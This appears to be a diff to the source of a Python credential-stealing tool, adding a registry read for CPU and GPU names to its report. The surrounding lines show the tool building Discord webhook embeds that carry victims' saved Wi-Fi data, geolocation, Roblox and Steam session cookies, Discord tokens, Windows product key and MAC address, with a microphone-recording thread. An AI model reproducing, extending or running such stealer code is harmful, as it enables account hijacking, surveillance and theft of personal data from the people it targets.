@@ -798,7 +798,29 @@ def windowsproductkey():
     except Exception as e:
         print(f"An error occurred: {e}")
         return None
+def CPU_GPU_values():
+    location = wrg.HKEY_LOCAL_MACHINE
 
+    # Define the registry paths
+    GPUpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinSAT"
+    CPUpath = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"
+
+    try:
+        soft1 = wrg.OpenKeyEx(location, GPUpath)
+        soft2 = wrg.OpenKeyEx(location, CPUpath)
+
+        GPU = wrg.QueryValueEx(soft1, "PrimaryAdapterString")
+        CPU = wrg.QueryValueEx(soft2, "ProcessorNameString")
+
+        wrg.CloseKey(soft1)
+        wrg.CloseKey(soft2)
+        
+        return CPU[0], GPU[0]
+
+    except FileNotFoundError:
+        print("The specified path is not found in the Windows Registry.")
+    except Exception as e:
+        print(f"An error occurred: {e}") 
 
 
     
@@ -811,7 +833,7 @@ micthread=threading.Thread(target=record_audio)
 wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
 geolocationembed=DiscordEmbed(title='Geolocation Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
-sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Windows Product Key: {windowsproductkey()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
+sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Windows Product Key: {windowsproductkey()}```\n```CPU: {CPU_GPU_values()[0]}```\n```GPU: {CPU_GPU_values()[1]}```\n```Ram: {info["RAM"]}```\n```CPU Architecture: {info["Machine"]}```\n```Windows Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
 steamloginembed = DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{opera_steam_cookie}```\nChrome:```{chrome_steam_cookie}```\nEdge:```{edge_steam_cookie}```\nFirefox:```{firefox_steam_cookie}```',color='4e6cd9')
 steamsesembed = DiscordEmbed(title='Steam sessionid cookies',description=f'Opera:```{opera_session_cookie}```\nChrome:```{chrome_session_cookie}```\nEdge:```{edge_session_cookie}```\nFirefox:```{firefox_session_cookie}```',color='4e6cd9')
 discordtokenembed= DiscordEmbed(title='Discord Token(s)',description='# Tokens:\n')
